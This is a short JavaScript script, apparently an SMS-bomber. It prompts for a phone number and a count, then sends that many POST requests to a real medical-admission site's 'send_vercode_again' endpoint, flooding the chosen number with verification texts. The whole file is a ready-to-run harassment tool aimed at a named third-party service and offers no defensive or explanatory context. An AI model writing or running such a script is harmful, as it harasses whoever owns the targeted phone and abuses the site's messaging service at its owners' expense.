const url = "https://admission.medico.com.bd/2023/send_vercode_again";
const headers = new Headers({
  "Content-Type": "application/x-www-form-urlencoded",
});

const number = prompt("Enter phone number:");
const amount = prompt("Enter the desired amount:");

const data = new URLSearchParams();
data.append("phone", number);

for (let i = 0; i < amount; i++) {
  fetch(url, {
    method: "POST",
    headers: headers,
    body: data,
  })
    .then((response) => response.text())
    .then((responseData) => console.log(responseData))
    .catch((error) => console.error(error));
}
